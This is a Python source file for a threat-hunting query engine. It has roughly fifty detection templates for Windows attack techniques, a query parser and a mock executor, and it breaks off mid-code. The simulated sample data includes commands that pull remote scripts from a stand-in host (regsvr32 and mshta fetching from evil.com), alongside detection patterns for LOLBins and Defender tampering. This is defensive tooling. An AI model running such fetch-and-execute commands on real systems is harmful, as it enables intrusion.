# -*- coding: utf-8 -*-
"""
hunt_query_engine.py — 狩猎查询引擎。

提供类SQL狩猎查询语言的解析、验证、执行与分页能力，
内置 50+ 常见狩猎查询模板库，支持查询保存/分享/版本管理，
以及查询性能优化建议。

设计定位：仅用于经过授权的防御性威胁狩猎，输出检测结果与查询建议。
"""

from __future__ import annotations

import hashlib
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple


# --------------------------------------------------------------------------- #
# 查询模板数据结构
# --------------------------------------------------------------------------- #
@dataclass
class QueryTemplate:
    """狩猎查询模板定义。"""
    template_id: str
    name: str
    category: str          # process / network / file / registry / user / login / combined
    mitre_technique: str   # ATT&CK 技术编号
    description: str
    query: str             # 类SQL查询语句
    severity: str = "medium"  # low / medium / high / critical
    tags: List[str] = field(default_factory=list)
    author: str = "system"


# --------------------------------------------------------------------------- #
# 50+ 常见狩猎查询模板库
# --------------------------------------------------------------------------- #
HUNT_QUERY_TEMPLATES: List[QueryTemplate] = [
    # ---- 进程类狩猎查询 ----
    QueryTemplate(
        template_id="tpl_proc_001",
        name="异常PowerShell编码命令",
        category="process",
        mitre_technique="T1059.001",
        description="查找PowerShell执行Base64编码或混淆命令行参数",
        query="FROM process WHERE process_name = 'powershell.exe' AND command_line MATCHES '-enc|-e |-encodedcommand|FromBase64String'",
        severity="high",
        tags=["powershell", "编码", "混淆"],
    ),
    QueryTemplate(
        template_id="tpl_proc_002",
        name="罕见父进程的cmd.exe",
        category="process",
        mitre_technique="T1059.003",
        description="查找父进程为非标准启动器的cmd.exe实例",
        query="FROM process WHERE process_name = 'cmd.exe' AND parent_process_name NOT IN ('explorer.exe','services.exe','winlogon.exe','svchost.exe','taskhostw.exe','mmc.exe')",
        severity="high",
        tags=["cmd", "父进程", "异常"],
    ),
    QueryTemplate(
        template_id="tpl_proc_003",
        name="Regsvr32Squiblydoo执行",
        category="process",
        mitre_technique="T1218.010",
        description="查找regsvr32执行远程SCT脚本或非标准DLL",
        query="FROM process WHERE process_name = 'regsvr32.exe' AND command_line MATCHES '/i:.*http|scrobj|sct'",
        severity="high",
        tags=["regsvr32", "白名单绕过"],
    ),
    QueryTemplate(
        template_id="tpl_proc_004",
        name="Rundll32执行JavaScript",
        category="process",
        mitre_technique="T1218.011",
        description="查找rundll32加载javascript或url协议",
        query="FROM process WHERE process_name = 'rundll32.exe' AND command_line MATCHES 'javascript:|jscript:|vbscript:|mshtml'",
        severity="high",
        tags=["rundll32", "白名单绕过"],
    ),
    QueryTemplate(
        template_id="tpl_proc_005",
        name="WMI创建远程进程",
        category="process",
        mitre_technique="T1047",
        description="查找wmic.exe或powershell Invoke-WmiMethod创建进程",
        query="FROM process WHERE (process_name = 'wmic.exe' OR process_name = 'wmiprvse.exe') AND command_line MATCHES 'process.*call.*create|Win32_Process'",
        severity="high",
        tags=["wmi", "远程执行"],
    ),
    QueryTemplate(
        template_id="tpl_proc_006",
        name="可疑进程注入检测",
        category="process",
        mitre_technique="T1055",
        description="查找进程通过CreateRemoteThread等方式注入",
        query="FROM process WHERE process_name IN ('cscript.exe','wscript.exe','mshta.exe') AND parent_process_name IN ('outlook.exe','winword.exe','excel.exe','powershell.exe')",
        severity="critical",
        tags=["进程注入", "钓鱼"],
    ),
    QueryTemplate(
        template_id="tpl_proc_007",
        name="Office宏启动子进程",
        category="process",
        mitre_technique="T1566.001",
        description="查找Office应用启动可疑子进程",
        query="FROM process WHERE parent_process_name IN ('winword.exe','excel.exe','powerpnt.exe','outlook.exe') AND process_name NOT IN ('conhost.exe','splwow64.exe','winword.exe')",
        severity="critical",
        tags=["宏", "钓鱼", "office"],
    ),
    QueryTemplate(
        template_id="tpl_proc_008",
        name="LOLBin执行可疑参数",
        category="process",
        mitre_technique="T1218",
        description="查找可信系统二进制文件执行可疑命令行",
        query="FROM process WHERE process_name IN ('mshta.exe','cmstp.exe','installutil.exe','regsvcs.exe','regasm.exe') AND command_line MATCHES 'http|script|download|execute'",
        severity="high",
        tags=["lolbin", "白名单绕过"],
    ),
    QueryTemplate(
        template_id="tpl_proc_009",
        name="临时目录执行进程",
        category="process",
        mitre_technique="T1036.005",
        description="查找从临时目录执行的进程",
        query="FROM process WHERE process_path MATCHES 'C:\\\\Users\\\\.*\\\\AppData\\\\Local\\\\Temp\\\\|C:\\\\Windows\\\\Temp\\\\|/tmp/'",
        severity="high",
        tags=["临时目录", "落地执行"],
    ),
    QueryTemplate(
        template_id="tpl_proc_010",
        name="无签名进程执行",
        category="process",
        mitre_technique="T1553.002",
        description="查找无数字签名或签名无效的进程",
        query="FROM process WHERE process_name NOT IN ('svchost.exe','lsass.exe','wininit.exe','csrss.exe') AND signature_status IN ('unsigned','invalid','expired')",
        severity="medium",
        tags=["签名", "无签名"],
    ),
    QueryTemplate(
        template_id="tpl_proc_011",
        name="进程命令行含Base64",
        category="process",
        mitre_technique="T1027",
        description="查找命令行参数包含长Base64编码字符串",
        query="FROM process WHERE command_line MATCHES '[A-Za-z0-9+/]{60,}={0,2}'",
        severity="high",
        tags=["编码", "混淆"],
    ),
    QueryTemplate(
        template_id="tpl_proc_012",
        name="服务宿主启动可疑进程",
        category="process",
        mitre_technique="T1543.003",
        description="查找svchost启动非标准服务进程",
        query="FROM process WHERE parent_process_name = 'svchost.exe' AND process_name NOT IN ('svchost.exe','wuauclt.exe','spoolsv.exe','lsass.exe','services.exe')",
        severity="high",
        tags=["服务", "持久化"],
    ),
    # ---- 网络类狩猎查询 ----
    QueryTemplate(
        template_id="tpl_net_001",
        name="异常出站连接到已知C2",
        category="network",
        mitre_technique="T1071",
        description="查找主机连接到已知恶意IP或域名",
        query="FROM network WHERE destination_ip IN (SELECT ip FROM threat_intel.malicious_ips) OR destination_domain IN (SELECT domain FROM threat_intel.malicious_domains)",
        severity="critical",
        tags=["c2", "威胁情报"],
    ),
    QueryTemplate(
        template_id="tpl_net_002",
        name="罕见高位端口出站连接",
        category="network",
        mitre_technique="T1043",
        description="查找连接到非常见高位端口的出站流量",
        query="FROM network WHERE direction = 'outbound' AND destination_port > 1024 AND destination_port NOT IN (80,443,53,8080,8443,3389,22) AND bytes_sent > 10000",
        severity="medium",
        tags=["高位端口", "异常连接"],
    ),
    QueryTemplate(
        template_id="tpl_net_003",
        name="DNS隧道检测",
        category="network",
        mitre_technique="T1071.004",
        description="查找DNS查询中含长子域名或高TXT记录",
        query="FROM network WHERE protocol = 'dns' AND (query_name LENGTH > 50 OR query_type = 'TXT') GROUP BY source_ip HAVING COUNT(*) > 100",
        severity="high",
        tags=["dns", "隧道"],
    ),
    QueryTemplate(
        template_id="tpl_net_004",
        name="横向SMB连接",
        category="network",
        mitre_technique="T1021.002",
        description="查找同一用户短时间内连接多台主机SMB服务",
        query="FROM network WHERE destination_port = 445 AND direction = 'outbound' GROUP BY source_ip, source_user HAVING COUNT(DISTINCT destination_ip) > 5",
        severity="high",
        tags=["smb", "横向移动"],
    ),
    QueryTemplate(
        template_id="tpl_net_005",
        name="RDP暴力破解后成功",
        category="network",
        mitre_technique="T1110",
        description="查找多次RDP失败后成功登录",
        query="FROM login WHERE service = 'rdp' AND result = 'failure' GROUP BY source_ip, destination_host HAVING COUNT(*) > 10 AND EXISTS (SELECT 1 FROM login l2 WHERE l2.source_ip = login.source_ip AND l2.service = 'rdp' AND l2.result = 'success' AND l2.timestamp > login.timestamp)",
        severity="critical",
        tags=["rdp", "暴力破解"],
    ),
    QueryTemplate(
        template_id="tpl_net_006",
        name="异常出站到云存储",
        category="network",
        mitre_technique="T1567.002",
        description="查找主机向云存储服务大量上传数据",
        query="FROM network WHERE destination_domain MATCHES 's3.amazonaws.com|blob.core.windows.net|drive.google.com|dropbox.com' AND bytes_sent > 5000000",
        severity="high",
        tags=["数据外渗", "云存储"],
    ),
    QueryTemplate(
        template_id="tpl_net_007",
        name="DNS查询频率异常",
        category="network",
        mitre_technique="T1071.004",
        description="查找单个主机DNS查询频率显著高于基线",
        query="FROM network WHERE protocol = 'dns' GROUP BY source_ip HAVING COUNT(*) > (SELECT AVG(count)*3 FROM (SELECT source_ip, COUNT(*) as count FROM network WHERE protocol = 'dns' GROUP BY source_ip))",
        severity="medium",
        tags=["dns", "频率异常"],
    ),
    QueryTemplate(
        template_id="tpl_net_008",
        name="ICMP隧道检测",
        category="network",
        mitre_technique="T1095",
        description="查找异常大小的ICMP数据包",
        query="FROM network WHERE protocol = 'icmp' AND packet_size > 1000",
        severity="high",
        tags=["icmp", "隧道"],
    ),
    QueryTemplate(
        template_id="tpl_net_009",
        name="非常规协议出站",
        category="network",
        mitre_technique="T1043",
        description="查找非常规协议的出站连接",
        query="FROM network WHERE direction = 'outbound' AND protocol IN ('ftp','telnet','irc','dns','snmp') AND destination_ip NOT IN (SELECT ip FROM trusted_servers)",
        severity="medium",
        tags=["协议异常"],
    ),
    QueryTemplate(
        template_id="tpl_net_010",
        name="Beaconing行为检测",
        category="network",
        mitre_technique="T1071",
        description="查找主机以固定时间间隔周期性连接同一目标",
        query="FROM network WHERE direction = 'outbound' GROUP BY source_ip, destination_ip, destination_port HAVING COUNT(*) > 20 AND (MAX(timestamp) - MIN(timestamp)) / COUNT(*) BETWEEN 50 AND 120",
        severity="high",
        tags=["beacon", "c2"],
    ),
    # ---- 文件类狩猎查询 ----
    QueryTemplate(
        template_id="tpl_file_001",
        name="可执行文件在用户目录",
        category="file",
        mitre_technique="T1204.002",
        description="查找用户目录下创建的可执行文件",
        query="FROM file WHERE file_path MATCHES 'C:\\\\Users\\\\.*\\\\(Downloads|Documents|Desktop)\\\\.*\\.(exe|dll|ps1|vbs|bat|cmd|scr|hta)' AND event_type = 'create'",
        severity="high",
        tags=["文件落地", "用户目录"],
    ),
    QueryTemplate(
        template_id="tpl_file_002",
        name="隐藏文件或扩展名伪装",
        category="file",
        mitre_technique="T1036.005",
        description="查找双扩展名或隐藏扩展名文件",
        query="FROM file WHERE file_name MATCHES '.*\\.(pdf|doc|docx|xls|jpg|png|txt|zip)\\.(exe|dll|ps1|vbs|bat|js)' OR file_name MATCHES '^\\..*\\.(exe|dll|ps1|vbs|bat|js)$'",
        severity="high",
        tags=["伪装", "扩展名"],
    ),
    QueryTemplate(
        template_id="tpl_file_003",
        name="系统目录可疑DLL写入",
        category="file",
        mitre_technique="T1574.001",
        description="查找系统目录中创建或修改的可疑DLL",
        query="FROM file WHERE file_path MATCHES 'C:\\\\Windows\\\\System32\\\\.*\\.dll' AND event_type IN ('create','modify') AND signature_status IN ('unsigned','invalid')",
        severity="critical",
        tags=["dll", "劫持"],
    ),
    QueryTemplate(
        template_id="tpl_file_004",
        name="压缩文件解压后执行",
        category="file",
        mitre_technique="T1204.002",
        description="查找压缩文件创建后短时间内有可执行文件被执行",
        query="FROM file WHERE file_extension IN ('zip','rar','7z') AND event_type = 'create' AND EXISTS (SELECT 1 FROM process p WHERE p.timestamp > file.timestamp AND p.timestamp < file.timestamp + 300 AND p.process_path MATCHES file.file_path REPLACE '\\\\.zip$' '\\\\*')",
        severity="high",
        tags=["压缩包", "执行链"],
    ),
    QueryTemplate(
        template_id="tpl_file_005",
        name="可疑文件签名异常",
        category="file",
        mitre_technique="T1553.002",
        description="查找已知合法文件路径但签名异常",
        query="FROM file WHERE file_path MATCHES 'C:\\\\Windows\\\\System32\\\\.*\\.dll' AND signature_status = 'invalid' AND publisher NOT IN ('Microsoft Corporation','Windows')",
        severity="critical",
        tags=["签名伪造"],
    ),
    QueryTemplate(
        template_id="tpl_file_006",
        name="PowerShell脚本文件创建",
        category="file",
        mitre_technique="T1059.001",
        description="查找.ps1脚本文件创建",
        query="FROM file WHERE file_extension = 'ps1' AND event_type = 'create' AND file_path NOT MATCHES 'C:\\\\Windows\\\\.*\\\\PowerShell\\\\.*'",
        severity="medium",
        tags=["ps1", "脚本"],
    ),
    QueryTemplate(
        template_id="tpl_file_007",
        name="文件删除后恢复痕迹",
        category="file",
        mitre_technique="T1070.004",
        description="查找短时间内创建后立即删除的文件",
        query="FROM file WHERE event_type = 'create' AND EXISTS (SELECT 1 FROM file f2 WHERE f2.file_path = file.file_path AND f2.event_type = 'delete' AND f2.timestamp < file.timestamp + 600)",
        severity="medium",
        tags=["文件擦除"],
    ),
    QueryTemplate(
        template_id="tpl_file_008",
        name="WebShell文件上传",
        category="file",
        mitre_technique="T1505.003",
        description="查找Web目录下创建的脚本文件",
        query="FROM file WHERE file_path MATCHES 'C:\\\\inetpub\\\\wwwroot\\\\|/var/www/html/|C:\\\\xampp\\\\htdocs\\\\' AND file_extension IN ('asp','aspx','php','jsp','cgi') AND event_type = 'create'",
        severity="critical",
        tags=["webshell", "web目录"],
    ),
    # ---- 注册表类狩猎查询 ----
    QueryTemplate(
        template_id="tpl_reg_001",
        name="持久化注册表修改",
        category="registry",
        mitre_technique="T1547.001",
        description="查找Run/RunOnce键值修改",
        query="FROM registry WHERE registry_key MATCHES 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' AND event_type = 'set'",
        severity="high",
        tags=["持久化", "run键"],
    ),
    QueryTemplate(
        template_id="tpl_reg_002",
        name="服务注册表创建",
        category="registry",
        mitre_technique="T1543.003",
        description="查找新服务注册",
        query="FROM registry WHERE registry_key MATCHES 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\.*' AND event_type = 'create'",
        severity="high",
        tags=["服务", "持久化"],
    ),
    QueryTemplate(
        template_id="tpl_reg_003",
        name="DLL劫持注册表修改",
        category="registry",
        mitre_technique="T1574.001",
        description="查找AppInit_DLLs或KnownDLLs修改",
        query="FROM registry WHERE registry_key MATCHES 'AppInit_DLLs|KnownDLLs|IFEO' AND event_type IN ('set','create')",
        severity="high",
        tags=["dll劫持", "持久化"],
    ),
    QueryTemplate(
        template_id="tpl_reg_004",
        name="安全工具注册表禁用",
        category="registry",
        mitre_technique="T1562.001",
        description="查找禁用Windows Defender或安全产品的注册表修改",
        query="FROM registry WHERE registry_key MATCHES 'Windows Defender\\\\DisableAntiSpyware|Windows Defender\\\\Real-Time Protection' AND registry_value = '1'",
        severity="critical",
        tags=["防御规避", "defender"],
    ),
    QueryTemplate(
        template_id="tpl_reg_005",
        name="Winlogon辅助DLL",
        category="registry",
        mitre_technique="T1547.004",
        description="查找Winlogon Userinit/Shell键值修改",
        query="FROM registry WHERE registry_key MATCHES 'Winlogon\\\\Userinit|Winlogon\\\\Shell' AND registry_value NOT MATCHES 'userinit.exe|explorer.exe'",
        severity="critical",
        tags=["持久化", "winlogon"],
    ),
    # ---- 用户类狩猎查询 ----
    QueryTemplate(
        template_id="tpl_user_001",
        name="特权用户异常创建",
        category="user",
        mitre_technique="T1136.001",
        description="查找新创建的特权用户",
        query="FROM user WHERE event_type = 'create' AND (group_membership CONTAINS 'Administrators' OR group_membership CONTAINS 'Domain Admins')",
        severity="critical",
        tags=["用户创建", "提权"],
    ),
    QueryTemplate(
        template_id="tpl_user_002",
        name="禁用安全工具用户操作",
        category="user",
        mitre_technique="T1562.001",
        description="查找用户禁用安全服务或进程",
        query="FROM process WHERE process_name IN ('net.exe','sc.exe','taskkill.exe') AND command_line MATCHES 'stop.*winDefend|disable.*Defender|/f /im MsMpEng'",
        severity="high",
        tags=["防御规避"],
    ),
    QueryTemplate(
        template_id="tpl_user_003",
        name="特权组异常添加",
        category="user",
        mitre_technique="T1078.002",
        description="查找用户被添加到特权组",
        query="FROM user WHERE event_type = 'group_modify' AND group_name IN ('Administrators','Domain Admins','Enterprise Admins','Schema Admins')",
        severity="critical",
        tags=["权限提升"],
    ),
    QueryTemplate(
        template_id="tpl_user_004",
        name="可疑账号属性修改",
        category="user",
        mitre_technique="T1098.007",
        description="查找账号密码永不过期或禁用状态修改",
        query="FROM user WHERE event_type = 'modify' AND (modified_attributes CONTAINS 'password_never_expires' OR modified_attributes CONTAINS 'disabled')",
        severity="high",
        tags=["账号篡改"],
    ),
    QueryTemplate(
        template_id="tpl_user_005",
        name="隐藏用户创建",
        category="user",
        mitre_technique="T1136.001",
        description="查找用户名以$结尾的隐藏用户",
        query="FROM user WHERE event_type = 'create' AND user_name MATCHES '.*\\$$'",
        severity="critical",
        tags=["隐藏用户"],
    ),
    # ---- 登录类狩猎查询 ----
    QueryTemplate(
        template_id="tpl_login_001",
        name="大量失败登录后成功登录",
        category="login",
        mitre_technique="T1110",
        description="查找多次失败登录后成功登录（暴力破解成功）",
        query="FROM login WHERE result = 'failure' GROUP BY source_ip, destination_host, service HAVING COUNT(*) > 5 AND EXISTS (SELECT 1 FROM login l2 WHERE l2.source_ip = login.source_ip AND l2.destination_host = login.destination_host AND l2.service = login.service AND l2.result = 'success' AND l2.timestamp > login.timestamp AND l2.timestamp < login.timestamp + 3600)",
        severity="critical",
        tags=["暴力破解", "横向"],
    ),
    QueryTemplate(
        template_id="tpl_login_002",
        name="不可能旅行检测",
        category="login",
        mitre_technique="T1078",
        description="查找同一用户短时间内从不同地理位置登录",
        query="FROM login WHERE result = 'success' GROUP BY user_name HAVING COUNT(DISTINCT geo_location) > 1 AND (MAX(timestamp) - MIN(timestamp)) < 7200",
        severity="high",
        tags=["不可能旅行", "地理"],
    ),
    QueryTemplate(
        template_id="tpl_login_003",
        name="非工作时间登录",
        category="login",
        mitre_technique="T1078",
        description="查找非工作时间（夜间/周末）的成功登录",
        query="FROM login WHERE result = 'success' AND (HOUR(timestamp) < 6 OR HOUR(timestamp) > 22 OR DAYOFWEEK(timestamp) IN (0, 6))",
        severity="medium",
        tags=["异常时间", "登录"],
    ),
    QueryTemplate(
        template_id="tpl_login_004",
        name="特权账号远程登录",
        category="login",
        mitre_technique="T1078.002",
        description="查找特权账号通过RDP/SSH远程登录",
        query="FROM login WHERE result = 'success' AND service IN ('rdp','ssh','winrm') AND user_name MATCHES 'admin|administrator|root|sa' AND source_ip NOT IN (SELECT ip FROM management_ips)",
        severity="high",
        tags=["特权登录"],
    ),
    QueryTemplate(
        template_id="tpl_login_005",
        name="多个账号从同一IP登录",
        category="login",
        mitre_technique="T1110",
        description="查找同一源IP短时间内登录多个不同账号",
        query="FROM login WHERE result = 'success' GROUP BY source_ip HAVING COUNT(DISTINCT user_name) > 3",
        severity="high",
        tags=["多账号", "爆破"],
    ),
    QueryTemplate(
        template_id="tpl_login_006",
        name="NTLM降级登录",
        category="login",
        mitre_technique="T1558.003",
        description="查找NTLMv1或LM认证登录",
        query="FROM login WHERE auth_protocol IN ('ntlmv1','lm','ntlm') AND result = 'success'",
        severity="medium",
        tags=["ntlm", "降级"],
    ),
    QueryTemplate(
        template_id="tpl_login_007",
        name="Pass-the-Hash检测",
        category="login",
        mitre_technique="T1550.002",
        description="查找异常的Pass-the-Hash登录行为",
        query="FROM login WHERE auth_type = 'network' AND logon_type = 3 AND service = 'smb' AND result = 'success' AND user_name NOT IN (SELECT user_name FROM baseline_service_accounts)",
        severity="high",
        tags=["ptt", "ptm"],
    ),
    # ---- 组合类狩猎查询 ----
    QueryTemplate(
        template_id="tpl_combo_001",
        name="完整攻击链重建",
        category="combined",
        mitre_technique="T1190",
        description="从初始访问到横向移动的完整攻击链",
        query="FROM process WHERE parent_process_name IN ('outlook.exe','winword.exe') AND process_name IN ('powershell.exe','cmd.exe','wscript.exe','cscript.exe') AND EXISTS (SELECT 1 FROM network n WHERE n.source_host = process.hostname AND n.destination_ip NOT IN (SELECT ip FROM internal_ips) AND n.timestamp BETWEEN process.timestamp AND process.timestamp + 600)",
        severity="critical",
        tags=["攻击链", "完整"],
    ),
    QueryTemplate(
        template_id="tpl_combo_002",
        name="勒索软件前置行为",
        category="combined",
        mitre_technique="T1486",
        description="查找卷影副本删除+大量文件修改的组合行为",
        query="FROM process WHERE process_name = 'vssadmin.exe' AND command_line MATCHES 'delete.*shadows' AND EXISTS (SELECT 1 FROM file f WHERE f.hostname = process.hostname AND f.event_type = 'modify' AND f.timestamp BETWEEN process.timestamp AND process.timestamp + 3600 GROUP BY f.hostname HAVING COUNT(*) > 100)",
        severity="critical",
        tags=["勒索软件"],
    ),
    QueryTemplate(
        template_id="tpl_combo_003",
        name="数据窃取完整链",
        category="combined",
        mitre_technique="T1048",
        description="查找文件收集+压缩+外发的完整数据窃取链",
        query="FROM file WHERE file_extension IN ('zip','rar','7z') AND event_type = 'create' AND file_path MATCHES 'C:\\\\Users\\\\.*\\\\AppData\\\\Local\\\\Temp' AND EXISTS (SELECT 1 FROM network n WHERE n.source_host = file.hostname AND n.bytes_sent > 1000000 AND n.timestamp BETWEEN file.timestamp AND file.timestamp + 1800)",
        severity="critical",
        tags=["数据窃取"],
    ),
    QueryTemplate(
        template_id="tpl_combo_004",
        name="APT横向移动链",
        category="combined",
        mitre_technique="T1021",
        description="查找WMI/PsExec/SMB横向移动链",
        query="FROM process WHERE process_name IN ('wmic.exe','psexesvc.exe','psexec.exe') AND command_line MATCHES '\\\\\\\\.*\\\\.*' AND EXISTS (SELECT 1 FROM network n WHERE n.source_host = process.hostname AND n.destination_port IN (445,135,5985,5986) AND n.timestamp BETWEEN process.timestamp - 60 AND process.timestamp + 60)",
        severity="high",
        tags=["横向移动", "apt"],
    ),
    QueryTemplate(
        template_id="tpl_combo_005",
        name="权限提升链",
        category="combined",
        mitre_technique="T1068",
        description="查找从低权限到高权限的提权链",
        query="FROM process WHERE integrity_level = 'high' AND parent_integrity_level = 'medium' AND process_name NOT IN ('explorer.exe','taskmgr.exe','mmc.exe','eventvwr.exe') AND EXISTS (SELECT 1 FROM user u WHERE u.hostname = process.hostname AND u.user_name = process.user_name AND u.event_type = 'escalation' AND u.timestamp BETWEEN process.timestamp - 300 AND process.timestamp)",
        severity="high",
        tags=["提权"],
    ),
]


# --------------------------------------------------------------------------- #
# 查询解析器
# --------------------------------------------------------------------------- #
class QueryParser:
    """类SQL狩猎查询语言解析器。"""

    VALID_ENTITIES = {"process", "network", "file", "registry", "user", "login"}
    VALID_OPERATORS = {"=", "!=", ">", "<", ">=", "<=", "MATCHES", "IN", "NOT IN", "CONTAINS", "BETWEEN", "LIKE"}

    def parse(self, query: str) -> Dict[str, Any]:
        """解析查询语句，返回结构化查询对象。"""
        query = query.strip()
        result = {
            "raw": query,
            "entity": None,
            "conditions": [],
            "aggregation": None,
            "having": None,
            "order_by": None,
            "limit": 100,
            "offset": 0,
            "valid": False,
            "errors": [],
            "warnings": [],
        }

        if not query:
            result["errors"].append("查询语句为空")
            return result

        # 解析 FROM 子句
        from_match = re.search(r"FROM\s+(\w+)", query, re.IGNORECASE)
        if not from_match:
            result["errors"].append("缺少 FROM 子句或实体名")
            return result
        entity = from_match.group(1).lower()
        if entity not in self.VALID_ENTITIES:
            result["errors"].append(f"不支持的实体类型: {entity}，支持: {', '.join(sorted(self.VALID_ENTITIES))}")
            return result
        result["entity"] = entity

        # 解析 WHERE 条件
        where_match = re.search(r"WHERE\s+(.+?)(?:GROUP|HAVING|ORDER|LIMIT|$)", query, re.IGNORECASE | re.DOTALL)
        if where_match:
            where_clause = where_match.group(1).strip()
            conditions = self._parse_conditions(where_clause)
            result["conditions"] = conditions

        # 解析 GROUP BY
        group_match = re.search(r"GROUP\s+BY\s+(.+?)(?:HAVING|ORDER|LIMIT|$)", query, re.IGNORECASE | re.DOTALL)
        if group_match:
            result["aggregation"] = {"group_by": [g.strip() for g in group_match.group(1).split(",")]}

        # 解析 HAVING
        having_match = re.search(r"HAVING\s+(.+?)(?:ORDER|LIMIT|$)", query, re.IGNORECASE | re.DOTALL)
        if having_match:
            result["having"] = having_match.group(1).strip()

        # 解析 ORDER BY
        order_match = re.search(r"ORDER\s+BY\s+(.+?)(?:LIMIT|$)", query, re.IGNORECASE | re.DOTALL)
        if order_match:
            result["order_by"] = order_match.group(1).strip()

        # 解析 LIMIT
        limit_match = re.search(r"LIMIT\s+(\d+)", query, re.IGNORECASE)
        if limit_match:
            result["limit"] = min(int(limit_match.group(1)), 10000)

        # 解析 OFFSET
        offset_match = re.search(r"OFFSET\s+(\d+)", query, re.IGNORECASE)
        if offset_match:
            result["offset"] = int(offset_match.group(1))

        result["valid"] = len(result["errors"]) == 0
        return result

    def _parse_conditions(self, where_clause: str) -> List[Dict[str, Any]]:
        """解析WHERE条件，支持AND/OR。"""
        conditions = []
        # 简化解析：按 AND 分割
        parts = re.split(r"\s+AND\s+", where_clause, flags=re.IGNORECASE)
        for part in parts:
            part = part.strip()
            if not part:
                continue
            cond = self._parse_single_condition(part)
            if cond:
                conditions.append(cond)
        return conditions

    def _parse_single_condition(self, cond_str: str) -> Optional[Dict[str, Any]]:
        """解析单个条件表达式。"""
        # 尝试匹配 field operator value 模式
        for op in ["NOT IN", "NOT MATCHES", "MATCHES", "NOT LIKE", "LIKE", "BETWEEN", "CONTAINS", "!=", ">=", "<=", "=", ">", "<", "IN"]:
            pattern = rf"(\w+)\s+{re.escape(op)}\s+(.+)"
            m = re.match(pattern, cond_str, re.IGNORECASE)
            if m:
                field = m.group(1).strip()
                value = m.group(2).strip().rstrip(")").strip()
                # 清理引号
                if value.startswith("'") and value.endswith("'"):
                    value = value[1:-1]
                return {"field": field, "operator": op, "value": value}
        return None


# --------------------------------------------------------------------------- #
# 查询执行器（模拟）
# --------------------------------------------------------------------------- #
class QueryExecutor:
    """模拟查询执行器，基于内存样本数据返回狩猎结果。"""

    def __init__(self) -> None:
        self._sample_data = self._generate_sample_data()
        self.execution_count = 0

    def _generate_sample_data(self) -> Dict[str, List[Dict[str, Any]]]:
        """生成模拟狩猎数据样本。"""
        hosts = ["WIN-SRV01", "WIN-SRV02", "WIN-PC-01", "WIN-PC-02", "WIN-PC-03", "DC01", "DC02", "WEB01", "DB01", "MAIL01"]
        users = ["admin", "jsmith", "ajones", "bwong", "cli", "svc_sql", "svc_iis", "backup"]
        now = int(time.time())

        processes: List[Dict[str, Any]] = []
        networks: List[Dict[str, Any]] = []
        files: List[Dict[str, Any]] = []
        logins: List[Dict[str, Any]] = []

        # 生成模拟进程数据
        suspicious_processes = [
            ("powershell.exe", "C:\\Windows\\System32\\powershell.exe", "explorer.exe", "powershell.exe -enc SQBFAFgA...", "high", "WIN-PC-01", "jsmith"),
            ("cmd.exe", "C:\\Windows\\System32\\cmd.exe", "winword.exe", "cmd.exe /c whoami", "high", "WIN-PC-02", "ajones"),
            ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "outlook.exe", "regsvr32 /i:http://evil.com/sct scrobj.dll", "critical", "WIN-PC-01", "jsmith"),
            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "explorer.exe", "rundll32 javascript:\\..\\mshtml,RunHTMLApplication", "high", "WIN-PC-03", "bwong"),
            ("wmic.exe", "C:\\Windows\\System32\\wmic.exe", "cmd.exe", "wmic /node:WIN-SRV01 process call create cmd.exe", "high", "WIN-PC-01", "admin"),
            ("cscript.exe", "C:\\Windows\\System32\\cscript.exe", "winword.exe", "cscript C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.js", "critical", "WIN-PC-01", "jsmith"),
            ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "explorer.exe", "mshta http://evil.com/payload.hta", "high", "WIN-PC-02", "ajones"),
        ]
        for i, (name, path, parent, cmd, sev, host, user) in enumerate(suspicious_processes):
            processes.append({
                "process_id": 10000 + i, "process_name": name, "process_path": path,
                "parent_process_name": parent, "command_line": cmd,
                "user_name": user, "hostname": host,
                "integrity_level": "high" if sev in ("critical", "high") else "medium",
                "signature_status": "unsigned" if i % 3 == 0 else "valid",
                "timestamp": now - i * 3600,
            })

        # 生成模拟网络数据
        suspicious_networks = [
            ("outbound", "45.132.9.87", "443", "tcp", 50000, "critical", "WIN-PC-01", "2026-09-14 08:15:00"),
            ("outbound", "185.220.101.45", "8080", "tcp", 120000, "high", "WIN-PC-02", "2026-09-14 09:22:00"),
            ("outbound", "104.244.74.15", "53", "udp", 5000, "high", "WIN-PC-01", "2026-09-14 10:05:00"),
            ("outbound", "192.168.1.50", "445", "tcp", 80000, "high", "WIN-PC-01", "2026-09-14 11:30:00"),
            ("outbound", "192.168.1.51", "445", "tcp", 60000, "high", "WIN-PC-01", "2026-09-14 11:32:00"),
            ("outbound", "192.168.1.52", "445", "tcp", 55000, "high", "WIN-PC-01", "2026-09-14 11:35:00"),
            ("outbound", "s3.amazonaws.com", "443", "tcp", 15000000, "high", "WIN-SRV01", "2026-09-14 14:00:00"),
            ("outbound", "185.199.108.153", "443", "tcp", 8000, "medium", "DC01", "2026-09-14 15:20:00"),
        ]
        for i, (direction, dst, port, proto, bytes_sent, sev, host, ts) in enumerate(suspicious_networks):
            networks.append({
                "source_ip": f"192.168.1.{20 + i}", "destination_ip": dst,
                "destination_port": int(port), "protocol": proto,
                "direction": direction, "bytes_sent": bytes_sent,
                "hostname": host, "severity": sev, "timestamp": ts,
            })

        # 生成模拟文件数据
        suspicious_files = [
            ("C:\\Users\\jsmith\\Downloads\\document.pdf.exe", "exe", "create", "unsigned", "WIN-PC-01", "2026-09-14 08:10:00"),
            ("C:\\Users\\ajones\\AppData\\Local\\Temp\\payload.js", "js", "create", "unsigned", "WIN-PC-02", "2026-09-14 09:15:00"),
            ("C:\\inetpub\\wwwroot\\shell.aspx", "aspx", "create", "unsigned", "WEB01", "2026-09-14 10:30:00"),
            ("C:\\Windows\\System32\\malicious.dll", "dll", "create", "invalid", "WIN-SRV01", "2026-09-14 12:00:00"),
            ("C:\\Users\\bwong\\Desktop\\report.xls.vbs", "vbs", "create", "unsigned", "WIN-PC-03", "2026-09-14 13:45:00"),
        ]
        for path, ext, evt, sig, host, ts in suspicious_files:
            files.append({
                "file_path": path, "file_name": path.split("\\")[-1],
                "file_extension": ext, "event_type": evt,
